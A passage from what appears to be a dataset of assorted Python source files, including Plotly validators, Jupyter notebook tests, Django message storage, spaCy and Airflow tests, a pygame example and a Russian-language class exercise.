        notebook_frontend.wait_for_selector(menu_item, EDITOR_PAGE).click()
        notebook_frontend.wait_for_selector(cancel_selector, EDITOR_PAGE).click()

        modal = notebook_frontend.wait_for_selector('.modal-backdrop', EDITOR_PAGE)
        modal.wait_for('hidden')

        assert notebook_frontend.is_kernel_running()


def test_menu_items(notebook_frontend):
    kernel_menu = notebook_frontend.locate('#kernellink', EDITOR_PAGE)

    for menu_item in restart_selectors:
        # Shutdown
        kernel_menu.click()
        notebook_frontend.wait_for_selector(shutdown_selector, EDITOR_PAGE).click()

        # Confirm shutdown
        notebook_frontend.wait_for_selector(confirm_selector, EDITOR_PAGE).click()

        notebook_frontend.wait_for_condition(lambda: not notebook_frontend.is_kernel_running())

        # Restart
        # (can't click the menu while a modal dialog is fading out)
        modal = notebook_frontend.locate('.modal-backdrop', EDITOR_PAGE).expect_not_to_be_visible()
        kernel_menu.click()

        notebook_frontend.wait_for_selector(menu_item, EDITOR_PAGE).click()
        notebook_frontend.wait_for_condition(
            lambda: notebook_frontend.is_kernel_running(),
            timeout=120,
            period=5
        )"
JY348	JY348-_domain.py	"import _plotly_utils.basevalidators


class DomainValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""domain"", parent_name=""layout.geo"", **kwargs):
        super(DomainValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Domain""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            column
                If there is a layout grid, use the domain for
                this column in the grid for this geo subplot .
                Note that geo subplots are constrained by
                domain. In general, when `projection.scale` is
                set to 1. a map will fit either its x or y
                domain, but not both.
            row
                If there is a layout grid, use the domain for
                this row in the grid for this geo subplot .
                Note that geo subplots are constrained by
                domain. In general, when `projection.scale` is
                set to 1. a map will fit either its x or y
                domain, but not both.
            x
                Sets the horizontal domain of this geo subplot
                (in plot fraction). Note that geo subplots are
                constrained by domain. In general, when
                `projection.scale` is set to 1. a map will fit
                either its x or y domain, but not both.
            y
                Sets the vertical domain of this geo subplot
                (in plot fraction). Note that geo subplots are
                constrained by domain. In general, when
                `projection.scale` is set to 1. a map will fit
                either its x or y domain, but not both.
"""""",
            ),
            **kwargs,
        )"
JY413	JY413-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""cone"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY434	JY434-_identifier.py	"import re

# generated by scripts/generate_identifier_pattern.py
pattern = re.compile(
    r""[\w·̀-ͯ·҃-֑҇-ׇֽֿׁׂׅׄؐ-ًؚ-ٰٟۖ-ۜ۟-۪ۤۧۨ-ܑۭܰ-݊ަ-ް߫-߳ࠖ-࠙ࠛ-ࠣࠥ-ࠧࠩ-࡙࠭-࡛ࣔ-ࣣ࣡-ःऺ-़ा-ॏ॑-ॗॢॣঁ-ঃ়া-ৄেৈো-্ৗৢৣਁ-ਃ਼ਾ-ੂੇੈੋ-੍ੑੰੱੵઁ-ઃ઼ા-ૅે-ૉો-્ૢૣଁ-ଃ଼ା-ୄେୈୋ-୍ୖୗୢୣஂா-ூெ-ைொ-்ௗఀ-ఃా-ౄె-ైొ-్ౕౖౢౣಁ-ಃ಼ಾ-ೄೆ-ೈೊ-್ೕೖೢೣഁ-ഃാ-ൄെ-ൈൊ-്ൗൢൣංඃ්ා-ුූෘ-ෟෲෳัิ-ฺ็-๎ັິ-ູົຼ່-ໍ༹༘༙༵༷༾༿ཱ-྄྆྇ྍ-ྗྙ-ྼ࿆ါ-ှၖ-ၙၞ-ၠၢ-ၤၧ-ၭၱ-ၴႂ-ႍႏႚ-ႝ፝-፟ᜒ-᜔ᜲ-᜴ᝒᝓᝲᝳ឴-៓៝᠋-᠍ᢅᢆᢩᤠ-ᤫᤰ-᤻ᨗ-ᨛᩕ-ᩞ᩠-᩿᩼᪰-᪽ᬀ-ᬄ᬴-᭄᭫-᭳ᮀ-ᮂᮡ-ᮭ᯦-᯳ᰤ-᰷᳐-᳔᳒-᳨᳭ᳲ-᳴᳸᳹᷀-᷵᷻-᷿‿⁀⁔⃐-⃥⃜⃡-⃰℘℮⳯-⵿⳱ⷠ-〪ⷿ-゙゚〯꙯ꙴ-꙽ꚞꚟ꛰꛱ꠂ꠆ꠋꠣ-ꠧꢀꢁꢴ-ꣅ꣠-꣱ꤦ-꤭ꥇ-꥓ꦀ-ꦃ꦳-꧀ꧥꨩ-ꨶꩃꩌꩍꩻ-ꩽꪰꪲ-ꪴꪷꪸꪾ꪿꫁ꫫ-ꫯꫵ꫶ꯣ-ꯪ꯬꯭ﬞ︀-️︠-︯︳︴﹍-﹏＿𐇽𐋠𐍶-𐍺𐨁-𐨃𐨅𐨆𐨌-𐨏𐨸-𐨿𐨺𐫦𐫥𑀀-𑀂𑀸-𑁆𑁿-𑂂𑂰-𑂺𑄀-𑄂𑄧-𑅳𑄴𑆀-𑆂𑆳-𑇊𑇀-𑇌𑈬-𑈷𑈾𑋟-𑋪𑌀-𑌃𑌼𑌾-𑍄𑍇𑍈𑍋-𑍍𑍗𑍢𑍣𑍦-𑍬𑍰-𑍴𑐵-𑑆𑒰-𑓃𑖯-𑖵𑖸-𑗀𑗜𑗝𑘰-𑙀𑚫-𑚷𑜝-𑜫𑰯-𑰶𑰸-𑰿𑲒-𑲧𑲩-𑲶𖫰-𖫴𖬰-𖬶𖽑-𖽾𖾏-𖾒𛲝𛲞𝅥-𝅩𝅭-𝅲𝅻-𝆂𝆅-𝆋𝆪-𝆭𝉂-𝉄𝨀-𝨶𝨻-𝩬𝩵𝪄𝪛-𝪟𝪡-𝪯𞀀-𞀆𞀈-𞀘𞀛-𞀡𞀣𞀤𞀦-𞣐𞀪-𞣖𞥄-𞥊󠄀-󠇯]+""  # noqa: B950
)"
JY272	JY272-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""scatterpolar.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY223	JY223-session.py	"import json

from django.contrib.messages.storage.base import BaseStorage
from django.contrib.messages.storage.cookie import MessageDecoder, MessageEncoder
from django.core.exceptions import ImproperlyConfigured


class SessionStorage(BaseStorage):
    """"""
    Store messages in the session (that is, django.contrib.sessions).
    """"""

    session_key = ""_messages""

    def __init__(self, request, *args, **kwargs):
        if not hasattr(request, ""session""):
            raise ImproperlyConfigured(
                ""The session-based temporary message storage requires session ""
                ""middleware to be installed, and come before the message ""
                ""middleware in the MIDDLEWARE list.""
            )
        super().__init__(request, *args, **kwargs)

    def _get(self, *args, **kwargs):
        """"""
        Retrieve a list of messages from the request's session. This storage
        always stores everything it is given, so return True for the
        all_retrieved flag.
        """"""
        return (
            self.deserialize_messages(self.request.session.get(self.session_key)),
            True,
        )

    def _store(self, messages, response, *args, **kwargs):
        """"""
        Store a list of messages to the request's session.
        """"""
        if messages:
            self.request.session[self.session_key] = self.serialize_messages(messages)
        else:
            self.request.session.pop(self.session_key, None)
        return []

    def serialize_messages(self, messages):
        encoder = MessageEncoder()
        return encoder.encode(messages)

    def deserialize_messages(self, data):
        if data and isinstance(data, str):
            return json.loads(data, cls=MessageDecoder)
        return data"
JD0	JD0-1_selectstations.py	"import streamlit as st
from streamlit_plotly_events import plotly_events
import numpy as np
import plotly.graph_objects as go
from plotly import subplots
import os, sys
import pandas as pd
import os
from PIL import Image

cptpath = os.getcwd()+r'/asl'
sys.path.append(cptpath)
import asl

def rms(y):
    N = len(y)
    y = np.array(y)
    y -= np.nanmean(y)
    rms = np.sqrt(np.sum(y**2) / N)
    return rms


@st.cache_data(persist=""disk"")
def make_ustation_list():
    lst = []
    return lst

colors = ['#F75C2F', '#2EA9DF', '#7BA23F', 'blue', 'green', 'orange', 'red']

station_list = ['N.ASIV', 'N.ASHV', 'N.ASNV', 'N.ASTV',  'V.ASOB', 'V.ASO2', 'V.ASOC']

st.header('select stations')
image = Image.open('map/img/map.png')
st.image(image, width=400)

col = st.columns(4)
ASIV = col[0].checkbox(label=station_list[0])
ASHV = col[1].checkbox(label=station_list[1])
ASNV = col[2].checkbox(label=station_list[2])
ASTV = col[3].checkbox(label=station_list[3])

col = st.columns(4)
ASOB = col[0].checkbox(label=station_list[4])
ASO2 = col[1].checkbox(label=station_list[5])
ASOC = col[2].checkbox(label=station_list[6])

used_station_list = []; used_station_list_idx = []
if ASIV:
    used_station_list.append(station_list[0])
    used_station_list_idx.append(0)
if ASHV:
    used_station_list.append(station_list[1])
    used_station_list_idx.append(1)
if ASNV:
    used_station_list.append(station_list[2])
    used_station_list_idx.append(2)
if ASTV:
    used_station_list.append(station_list[3])
    used_station_list_idx.append(3)
if ASOB:
    used_station_list.append(station_list[4])
    used_station_list_idx.append(4)
if ASO2:
    used_station_list.append(station_list[5])
    used_station_list_idx.append(5)
if ASOC:
    used_station_list.append(station_list[6])
    used_station_list_idx.append(6)

if st.button(label='save stations'):
    
    ustation_list = make_ustation_list()
    for i in used_station_list:
        ustation_list.append(i)

    st.session_state['ustations'] = ustation_list

    st.write('saved')
    #st.write(ustation_list)"
JD163	JD163-create_project_plans.py	"from environs import Env

from api import MentorsAPI


def main() -> None:
    env = Env()
    env.read_env()

    mentors_api = MentorsAPI(env.str('DVMN_USERNAME'), env.str('DVMN_PASSWORD'))
    mentor_uuid = env.str('MENTOR_UUID')

    orders = mentors_api.get_mentor_orders(mentor_uuid)

    for order in orders:
        if not order['is_active']:
            continue

        notes = order['student']['notes']
        proj_notes = [
            n for n in notes if 
            'На проекте' in n['content']
            and not n['is_hidden']
        ]
        if not proj_notes:
            continue

        tasks = mentors_api.get_study_program_by_order_uuid(order['uuid'])
        project_task = None
        for task in tasks:
            if any([
                'Командные проекты' not in task['trainer']['title'],
                task['is_completed']
            ]):
                continue

            project_task = task
            break
        
        if not project_task:
            print(f'Ученику: {order[""uuid""]} не выдан командный проект.')
            continue
        
        try:
            plan_uuid = mentors_api.create_weekly_plan(
                order['uuid'],
                project_task['uuid'],
                project_task['execution_time']
            )
            mentors_api.create_gist(plan_uuid)
            mentors_api.give_weekly_plan(
                order['uuid'],
                project_task['uuid'],
                project_task['execution_time'],
                plan_uuid
            )
            mentors_api.update_gist(plan_uuid)
        except Exception as err:
            print(f'Что-то пошло не так в заказе: {order[""uuid""]}')
        else:
            for n in proj_notes:
                mentors_api.close_note(n['uuid'])

            mentors_api.add_note(
                student_uuid=order['student']['profile']['uuid'],
                comment='$: Настала пора командных проектов! Как настрой?)'
            )



if __name__ == '__main__':
    main()"
JD494	JD494-predict.py	"import os
import json

import torch
from PIL import Image
from torchvision import transforms
import matplotlib.pyplot as plt

from vit_model import vit_base_patch16_224_in21k as create_model


def main():
    device = torch.device(""cuda:0"" if torch.cuda.is_available() else ""cpu"")

    data_transform = transforms.Compose(
        [transforms.Resize(256),
         transforms.CenterCrop(224),
         transforms.ToTensor(),
         transforms.Normalize([0.5, 0.5, 0.5], [0.5, 0.5, 0.5])])

    # load image
    img_path = ""../tulip.jpg""
    assert os.path.exists(img_path), ""file: '{}' dose not exist."".format(img_path)
    img = Image.open(img_path)
    plt.imshow(img)
    # [N, C, H, W]
    img = data_transform(img)
    # expand batch dimension
    img = torch.unsqueeze(img, dim=0)

    # read class_indict
    json_path = './class_indices.json'
    assert os.path.exists(json_path), ""file: '{}' dose not exist."".format(json_path)

    with open(json_path, ""r"") as f:
        class_indict = json.load(f)

    # create model
    model = create_model(num_classes=5, has_logits=False).to(device)
    # load model weights
    model_weight_path = ""./weights/model-9.pth""
    model.load_state_dict(torch.load(model_weight_path, map_location=device))
    model.eval()
    with torch.no_grad():
        # predict class
        output = torch.squeeze(model(img.to(device))).cpu()
        predict = torch.softmax(output, dim=0)
        predict_cla = torch.argmax(predict).numpy()

    print_res = ""class: {}   prob: {:.3}"".format(class_indict[str(predict_cla)],
                                                 predict[predict_cla].numpy())
    plt.title(print_res)
    for i in range(len(predict)):
        print(""class: {:10}   prob: {:.3}"".format(class_indict[str(i)],
                                                  predict[i].numpy()))
    plt.show()


if __name__ == '__main__':
    main()"
JY505	JY505-final_validate.py	"from abc import ABC, abstractmethod
from typing import Any
import contextvars

from esphome.types import ConfigFragmentType, ID, ConfigPathType
import esphome.config_validation as cv


class FinalValidateConfig(ABC):
    @property
    @abstractmethod
    def data(self) -> dict[str, Any]:
        """"""A dictionary that can be used by post validation functions to store
        global data during the validation phase. Each component should store its
        data under a unique key
        """"""

    @abstractmethod
    def get_path_for_id(self, id: ID) -> ConfigPathType:
        """"""Get the config path a given ID has been declared in.

        This is the location under the _validated_ config (for example, with cv.ensure_list applied)
        Raises KeyError if the id was not declared in the configuration.
        """"""

    @abstractmethod
    def get_config_for_path(self, path: ConfigPathType) -> ConfigFragmentType:
        """"""Get the config fragment for the given global path.

        Raises KeyError if a key in the path does not exist.
        """"""


FinalValidateConfig.register(dict)

# Context variable tracking the full config for some final validation functions.
full_config: contextvars.ContextVar[FinalValidateConfig] = contextvars.ContextVar(
    ""full_config""
)


def id_declaration_match_schema(schema):
    """"""A final-validation schema function that applies a schema to the outer config fragment of an
    ID declaration.

    This validator must be applied to ID values.
    """"""
    if not isinstance(schema, cv.Schema):
        schema = cv.Schema(schema, extra=cv.ALLOW_EXTRA)

    def validator(value):
        fconf = full_config.get()
        path = fconf.get_path_for_id(value)[:-1]
        declaration_config = fconf.get_config_for_path(path)
        with cv.prepend_path([cv.ROOT_CONFIG_PATH] + path):
            return schema(declaration_config)

    return validator"
JD197	JD197-sgf.py	"""""""
    pygments.lexers.sgf
    ~~~~~~~~~~~~~~~~~~~

    Lexer for Smart Game Format (sgf) file format.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer, bygroups
from pygments.token import Name, Literal, String, Punctuation, Whitespace

__all__ = [""SmartGameFormatLexer""]


class SmartGameFormatLexer(RegexLexer):
    """"""
    Lexer for Smart Game Format (sgf) file format.

    The format is used to store game records of board games for two players
    (mainly Go game).

    .. versionadded:: 2.4
    """"""
    name = 'SmartGameFormat'
    url = 'https://www.red-bean.com/sgf/'
    aliases = ['sgf']
    filenames = ['*.sgf']

    tokens = {
        'root': [
            (r'[():;]+', Punctuation),
            # tokens:
            (r'(A[BW]|AE|AN|AP|AR|AS|[BW]L|BM|[BW]R|[BW]S|[BW]T|CA|CH|CP|CR|'
             r'DD|DM|DO|DT|EL|EV|EX|FF|FG|G[BW]|GC|GM|GN|HA|HO|ID|IP|IT|IY|KM|'
             r'KO|LB|LN|LT|L|MA|MN|M|N|OB|OM|ON|OP|OT|OV|P[BW]|PC|PL|PM|RE|RG|'
             r'RO|RU|SO|SC|SE|SI|SL|SO|SQ|ST|SU|SZ|T[BW]|TC|TE|TM|TR|UC|US|VW|'
             r'V|[BW]|C)',
             Name.Builtin),
            # number:
            (r'(\[)([0-9.]+)(\])',
             bygroups(Punctuation, Literal.Number, Punctuation)),
            # date:
            (r'(\[)([0-9]{4}-[0-9]{2}-[0-9]{2})(\])',
             bygroups(Punctuation, Literal.Date, Punctuation)),
            # point:
            (r'(\[)([a-z]{2})(\])',
             bygroups(Punctuation, String, Punctuation)),
            # double points:
            (r'(\[)([a-z]{2})(:)([a-z]{2})(\])',
             bygroups(Punctuation, String, Punctuation, String, Punctuation)),

            (r'(\[)([\w\s#()+,\-.:?]+)(\])',
             bygroups(Punctuation, String, Punctuation)),
            (r'(\[)(\s.*)(\])',
             bygroups(Punctuation, Whitespace, Punctuation)),
            (r'\s+', Whitespace)
        ],
    }"
JD502	JD502-test_windows.py	"import os
import shutil
import tempfile

import pytest

from pathy import Pathy

is_windows = os.name == ""nt""


@pytest.mark.skipif(not is_windows, reason=""requires windows"")
def test_windows_fluid_absolute_paths() -> None:
    # Path with \\ slashes
    tmp_dir = tempfile.mkdtemp()
    # Converted to the same path with / slashes
    alt_slashes = tmp_dir.replace(""\\\\"", ""/"").replace(""\\"", ""/"")

    # Make a folder from \\ absolute path
    fs_root = Pathy.fluid(tmp_dir)
    assert ""\\"" in str(fs_root), ""expected \\ separators in windows path""
    new_folder = Pathy.fluid(fs_root / ""sub-dir"")
    assert new_folder.exists() is False
    new_folder.mkdir()
    assert new_folder.exists() is True

    # Make a folder from / absolute path
    fs_root = Pathy.fluid(alt_slashes)
    new_folder = Pathy.fluid(fs_root / ""sub-dir-alt"")
    assert new_folder.exists() is False
    new_folder.mkdir()
    assert new_folder.exists() is True

    shutil.rmtree(tmp_dir)


@pytest.mark.skipif(not is_windows, reason=""requires windows"")
def test_windows_fluid_absolute_file_paths() -> None:
    # Path with \\ slashes
    tmp_dir = tempfile.mkdtemp()
    # Converted to the same path with / slashes
    alt_slashes = tmp_dir.replace(""\\\\"", ""/"").replace(""\\"", ""/"")

    # Make a folder from \\ absolute path
    fs_root = Pathy.fluid(f""file://{tmp_dir}"")
    assert ""\\"" in str(fs_root), ""expected \\ separators in windows path""
    new_folder = Pathy.fluid(fs_root / ""sub-dir"")
    assert new_folder.exists() is False
    new_folder.mkdir()
    assert new_folder.exists() is True

    # Make a folder from / absolute path
    fs_root = Pathy.fluid(f""file://{alt_slashes}"")
    new_folder = Pathy.fluid(fs_root / ""sub-dir-alt/"")
    assert new_folder.exists() is False
    new_folder.mkdir()
    assert new_folder.exists() is True

    shutil.rmtree(tmp_dir)"
JY342	JY342-setmodescale.py	"#!/usr/bin/env python
"""""" pygame.examples.setmodescale

On high resolution displays(4k, 1080p) and tiny graphics games (640x480)
show up very small so that they are unplayable. SCALED scales up the window
for you. The game thinks it's a 640x480 window, but really it can be bigger.
Mouse events are scaled for you, so your game doesn't need to do it.

Passing SCALED to pygame.display.set_mode means the resolution depends
on desktop size and the graphics are scaled.
""""""

import pygame as pg

pg.init()

RES = (160, 120)
FPS = 30
clock = pg.time.Clock()

print(""desktops"", pg.display.get_desktop_sizes())
screen = pg.display.set_mode(RES, pg.SCALED | pg.RESIZABLE)

# MAIN LOOP

done = False

i = 0
j = 0

r_name, r_flags = pg.display._get_renderer_info()
print(""renderer:"", r_name, ""flags:"", bin(r_flags))
for flag, name in [
    (1, ""software""),
    (2, ""accelerated""),
    (4, ""VSync""),
    (8, ""render to texture""),
]:
    if flag & r_flags:
        print(name)

while not done:
    for event in pg.event.get():
        if event.type == pg.KEYDOWN and event.key == pg.K_q:
            done = True
        if event.type == pg.QUIT:
            done = True
        if event.type == pg.KEYDOWN and event.key == pg.K_f:
            pg.display.toggle_fullscreen()
        if event.type == pg.VIDEORESIZE:
            pg.display._resize_event(event)

    i += 1
    i = i % screen.get_width()
    j += i % 2
    j = j % screen.get_height()

    screen.fill((255, 0, 255))
    pg.draw.circle(screen, (0, 0, 0), (100, 100), 20)
    pg.draw.circle(screen, (0, 0, 200), (0, 0), 10)
    pg.draw.circle(screen, (200, 0, 0), (160, 120), 30)
    pg.draw.line(screen, (250, 250, 0), (0, 120), (160, 0))
    pg.draw.circle(screen, (255, 255, 255), (i, j), 5)

    pg.display.flip()
    clock.tick(FPS)
pg.quit()"
JD480	JD480-test_parser.py	"import pytest
from spacy.lang.en import English
from spacy.training import Example
from thinc.api import Config

default_tok2vec_config = """"""
[model]
@architectures = ""spacy-legacy.HashEmbedCNN.v1""
pretrained_vectors = null
width = 96
depth = 4
embed_size = 2000
window_size = 1
maxout_pieces = 3
subword_features = true
""""""
DEFAULT_TOK2VEC_MODEL = Config().from_str(default_tok2vec_config)[""model""]

TRAIN_DATA = [
    (
        ""They trade mortgage-backed securities."",
        {
            ""heads"": [1, 1, 4, 4, 5, 1, 1],
            ""deps"": [""nsubj"", ""ROOT"", ""compound"", ""punct"", ""nmod"", ""dobj"", ""punct""],
        },
    ),
    (
        ""I like London and Berlin."",
        {
            ""heads"": [1, 1, 1, 2, 2, 1],
            ""deps"": [""nsubj"", ""ROOT"", ""dobj"", ""cc"", ""conj"", ""punct""],
        },
    ),
]


@pytest.mark.parametrize(
    ""parser_config"",
    [
        {
            ""@architectures"": ""spacy-legacy.TransitionBasedParser.v1"",
            ""state_type"": ""parser"",
            ""extra_state_tokens"": False,
            ""hidden_width"": 66,
            ""maxout_pieces"": 2,
            ""use_upper"": True,
            ""tok2vec"": DEFAULT_TOK2VEC_MODEL,
        }
    ],
)
def test_parser(parser_config):
    pipe_config = {""model"": parser_config}
    nlp = English()
    parser = nlp.add_pipe(""parser"", config=pipe_config)
    train_examples = []
    for text, annotations in TRAIN_DATA:
        train_examples.append(Example.from_dict(nlp.make_doc(text), annotations))
        for dep in annotations.get(""deps"", []):
            if dep is not None:
                parser.add_label(dep)
    optimizer = nlp.initialize(get_examples=lambda: train_examples)
    for i in range(150):
        losses = {}
        nlp.update(train_examples, sgd=optimizer, losses=losses)
    assert losses[""parser""] < 0.0001"
JY160	JY160-test_markdown.py	"""""""Test markdown rendering""""""


from nbformat.v4 import new_markdown_cell

from .utils import EDITOR_PAGE


def get_rendered_contents(nb):
    # TODO: Encapsulate element access/refactor so we're not accessing playwright element objects
    cl = [""text_cell"", ""render""]
    rendered_cells = [cell.locate("".text_cell_render"")
                      for cell in nb.cells
                      if all([c in cell.get_attribute(""class"") for c in cl])]
    return [x.get_inner_html().strip()
            for x in rendered_cells
            if x is not None]


def test_markdown_cell(prefill_notebook):
    notebook_frontend = prefill_notebook([new_markdown_cell(md) for md in [
        '# Foo', '**Bar**', '*Baz*', '```\nx = 1\n```', '```aaaa\nx = 1\n```',
        '```python\ns = ""$""\nt = ""$""\n```'
    ]])

    assert get_rendered_contents(notebook_frontend) == [
        '<h1 id=""Foo"">Foo<a class=""anchor-link"" href=""#Foo"">¶</a></h1>',
        '<p><strong>Bar</strong></p>',
        '<p><em>Baz</em></p>',
        '<pre><code>x = 1</code></pre>',
        '<pre><code class=""cm-s-ipython language-aaaa"">x = 1</code></pre>',
        '<pre><code class=""cm-s-ipython language-python"">' +
        '<span class=""cm-variable"">s</span> <span class=""cm-operator"">=</span> <span class=""cm-string"">""$""</span>\n' +
        '<span class=""cm-variable"">t</span> <span class=""cm-operator"">=</span> <span class=""cm-string"">""$""</span></code></pre>'
    ]


def test_markdown_headings(notebook_frontend):
    for i in [1, 2, 3, 4, 5, 6, 2, 1]:
        notebook_frontend.add_markdown_cell()
        cell_text = notebook_frontend.evaluate(f""""""
            var cell = IPython.notebook.get_cell(1);
            cell.set_heading_level({i});
            cell.get_text();
        """""", page=EDITOR_PAGE)
        assert notebook_frontend.get_cell_contents(1) == ""#"" * i + "" ""
        notebook_frontend.delete_cell(1)"
JY327	JY327-task_05.py	"""""""
Задание №5

Дорабатываем класс прямоугольник из прошлого семинара.

Добавьте возможность сложения и вычитания.

При этом должен создаваться новый экземпляр прямоугольника.

Складываем и вычитаем периметры, а не длину и ширину.

При вычитании не допускайте отрицательных значений.
""""""
""""""
Задание №2
Создайте класс прямоугольник.
Класс должен принимать длину и ширину при создании
экземпляра.
У класса должно быть два метода, возвращающие периметр
и площадь.
Если при создании экземпляра передаётся только одна
сторона, считаем что у нас квадрат.
""""""


class Rectangle:

    def __init__(self, length, width=None):
        self.length = length
        # self.width = width if width else length
        self.width = width if width is not None else length  # 35:37
        # self.width = length if width is None else width

    def area(self):
        return self.width * self.length

    def perimeter(self):
        return 2 * (self.width + self.length)

    def __add__(self, other):
        return self.perimeter() + other.perimeter()

    def __sub__(self, other):
        if self.perimeter() < other.perimeter():
            self.perimeter, other.perimeter = other.perimeter, self.perimeter
        return self.perimeter() - other.perimeter()


if __name__ == '__main__':
    r1 = Rectangle(2)
    print(r1.perimeter())
    r2 = Rectangle(4, 5)
    print(r2.perimeter())
    r3 = r1 + r2

    print(f'{r1 = }')
    print(f'{r3 = }')
    # print(r1 + r2)
    # print(r1 - r2)
""""""
8
18
r1 = <__main__.Rectangle object at 0x7f1fec69ffd0>
r3 = 26

Process finished with exit code 0
""""""
# 1:33:40"
JY359	JY359-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""icicle"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY230	JY230-test_pod_launcher_role.py	"# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

import jmespath
import pytest

from tests.charts.helm_template_generator import render_chart


class TestPodLauncher:
    @pytest.mark.parametrize(
        ""executor, rbac, allow, expected_accounts"",
        [
            (""CeleryKubernetesExecutor"", True, True, [""scheduler"", ""worker""]),
            (""KubernetesExecutor"", True, True, [""scheduler"", ""worker""]),
            (""CeleryExecutor"", True, True, [""worker""]),
            (""LocalExecutor"", True, True, [""scheduler""]),
            (""LocalExecutor"", False, False, []),
        ],
    )
    def test_pod_launcher_role(self, executor, rbac, allow, expected_accounts):
        docs = render_chart(
            values={
                ""rbac"": {""create"": rbac},
                ""allowPodLaunching"": allow,
                ""executor"": executor,
            },
            show_only=[""templates/rbac/pod-launcher-rolebinding.yaml""],
        )
        if expected_accounts:
            for idx, suffix in enumerate(expected_accounts):
                assert f""release-name-airflow-{suffix}"" == jmespath.search(f""subjects[{idx}].name"", docs[0])
        else:
            assert [] == docs"
JY149	JY149-cli.py	"""""""
For backwards-compatibility. keep this file.
(Many people are going to have key bindings that rely on this file.)
""""""
from .app import *

__all__ = [
    # Old names.
    ""HasArg"",
    ""HasCompletions"",
    ""HasFocus"",
    ""HasSelection"",
    ""HasValidationError"",
    ""IsDone"",
    ""IsReadOnly"",
    ""IsMultiline"",
    ""RendererHeightIsKnown"",
    ""InEditingMode"",
    ""InPasteMode"",
    ""ViMode"",
    ""ViNavigationMode"",
    ""ViInsertMode"",
    ""ViInsertMultipleMode"",
    ""ViReplaceMode"",
    ""ViSelectionMode"",
    ""ViWaitingForTextObjectMode"",
    ""ViDigraphMode"",
    ""EmacsMode"",
    ""EmacsInsertMode"",
    ""EmacsSelectionMode"",
    ""IsSearching"",
    ""HasSearch"",
    ""ControlIsSearchable"",
]

# Keep the original classnames for backwards compatibility.
